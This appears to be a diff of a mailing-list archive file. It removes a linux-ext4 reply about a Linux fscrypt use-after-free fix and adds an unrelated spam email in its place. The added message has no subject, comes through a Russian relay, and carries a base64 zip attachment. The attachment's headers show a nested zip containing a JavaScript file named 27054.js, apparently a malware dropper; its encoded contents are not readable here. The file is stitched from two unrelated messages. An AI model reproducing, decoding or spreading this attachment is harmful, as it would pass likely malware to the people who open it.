@@ -1,67 +1,105 @@
-From: Eric Biggers <ebiggers3@gmail.com>
-Subject: Re: [PATCH] fscrypt: remove broken support for detecting keyring key
- revocation
-Date: Tue, 14 Mar 2017 16:48:42 -0700
-Message-ID: <20170314234842.GB127087@gmail.com>
-References: <20170221230711.85222-1-ebiggers3@gmail.com>
+From: <befragung@hwk-erfurt.de>
+Subject: (unknown)
+Date: Wed, 15 Mar 2017 03:26:58 -0000
+Message-ID: <148954841888.25822.75416447737612597@zaural.ru>
+Reply-To: <befragung@hwk-erfurt.de>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: linux-fscrypt@vger.kernel.org, linux-ext4@vger.kernel.org,
-        linux-f2fs-devel@lists.sourceforge.net,
-        linux-kernel@vger.kernel.org, "Theodore Y . Ts'o" <tytso@mit.edu>,
-        Jaegeuk Kim <jaegeuk@kernel.org>,
-        Richard Weinberger <richard@nod.at>,
-        Anand Jain <anand.jain@oracle.com>,
-        Eric Biggers <ebiggers@google.com>, stable@vger.kernel.org
-To: linux-fsdevel@vger.kernel.org
-Return-path: <stable-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <20170221230711.85222-1-ebiggers3@gmail.com>
-Sender: stable-owner@vger.kernel.org
-List-Id: linux-ext4.vger.kernel.org
+Content-Type: application/zip; name="EMAIL_61_linux-ext4.zip"
+Content-Transfer-Encoding: base64
+To: "linux-ext4" <linux-ext4@vger.kernel.org>
+Return-path: <linux-ext4-owner@vger.kernel.org>
+Received: from ws135.zone31-163-131.zaural.ru ([31.163.131.135]:56678 "HELO
+        zaural.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750797AbdCOD1E (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
+        Tue, 14 Mar 2017 23:27:04 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-ext4-owner@vger.kernel.org
+List-ID: <linux-ext4.vger.kernel.org>
 
-On Tue, Feb 21, 2017 at 03:07:11PM -0800, Eric Biggers wrote:
-> From: Eric Biggers <ebiggers@google.com>
-> 
-> Filesystem encryption ostensibly supported revoking a keyring key that
-> had been used to "unlock" encrypted files, causing those files to become
-> "locked" again.  This was, however, buggy for several reasons, the most
-> severe of which was that when key revocation happened to be detected for
-> an inode, its fscrypt_info was immediately freed, even while other
-> threads could be using it for encryption or decryption concurrently.
-> This could be exploited to crash the kernel or worse.
-> 
-> This patch fixes the use-after-free by removing the code which detects
-> the keyring key having been revoked, invalidated, or expired.  Instead,
-> an encrypted inode that is "unlocked" now simply remains unlocked until
-> it is evicted from memory.  Note that this is no worse than the case for
-> block device-level encryption, e.g. dm-crypt, and it still remains
-> possible for a privileged user to evict unused pages, inodes, and
-> dentries by running 'sync; echo 3 > /proc/sys/vm/drop_caches', or by
-> simply unmounting the filesystem.  In fact, one of those actions was
-> already needed anyway for key revocation to work even somewhat sanely.
-> This change is not expected to break any applications.
-> 
-> In the future I'd like to implement a real API for fscrypt key
-> revocation that interacts sanely with ongoing filesystem operations ---
-> waiting for existing operations to complete and blocking new operations,
-> and invalidating and sanitizing key material and plaintext from the VFS
-> caches.  But this is a hard problem, and for now this bug must be fixed.
-> 
-> This bug affected almost all versions of ext4, f2fs, and ubifs
-> encryption, and it was potentially reachable in any kernel configured
-> with encryption support (CONFIG_EXT4_ENCRYPTION=y,
-> CONFIG_EXT4_FS_ENCRYPTION=y, CONFIG_F2FS_FS_ENCRYPTION=y, or
-> CONFIG_UBIFS_FS_ENCRYPTION=y).  Note that older kernels did not use the
-> shared fs/crypto/ code, but due to the potential security implications
-> of this bug, it may still be worthwhile to backport this fix to them.
-> 
-> Fixes: b7236e21d55f ("ext4 crypto: reorganize how we store keys in the inode")
-> Cc: stable@vger.kernel.org # v4.2+
-> Signed-off-by: Eric Biggers <ebiggers@google.com>
-
-
-Ted, can this be sent to Linus soon?  This needs to be fixed as it's a security
-vulnerability on some systems.
-
-Eric
+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
